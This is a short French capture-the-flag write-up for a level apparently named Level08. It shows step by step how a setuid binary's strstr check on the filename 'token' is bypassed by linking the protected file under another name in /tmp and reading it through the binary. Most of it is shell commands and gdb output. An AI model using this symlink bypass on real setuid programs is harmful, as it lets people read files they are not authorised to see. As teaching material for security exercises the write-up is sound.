# Level08

Premiere étape de recherche

	$ ls -la
	-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
	-rw-------  1 flag08  flag08    26 Mar  5  2016 token

On trouve un binaire setuid/getuid et un fichier "token"

	$ ./level08
	./level08 [file to read]

	$ ./level08 level08

Il affiche le contenu du fichier

	$ ./level08 token
	You may not access 'token'

Cela ne fonctionne pas sur le fichier "token"

Essayons avec un autre fichier dont nous n'avons pas les droits

	$ ./level08 .profile
	level08: Unable to open .profile: Permission denied

C'est pas la meme erreur qu'avec le fichier token. Il y a surement un check sur le nom du fichier

	$ gdb level08
	$ (gdb) disas main
	0x080485ba <+102>:	call   0x8048400 <strstr@plt>

La fonction strstr compare 2 chaines donc c'est ça

On a pas les droits pour cp ou mv dans /tmp donc on va faire un lien avec un autre nom vers le fichier token et essayer de l'ouvrir avec le binaire

	$ ln -s /home/user/level08/token /tmp/link
	$ ls -l /tmp/link
	lrwxrwxrwx 1 level08 level08 24 Nov 28 15:24 /tmp/link -> /home/user/level08/token

	$ ./level08 /tmp/link
	(good)
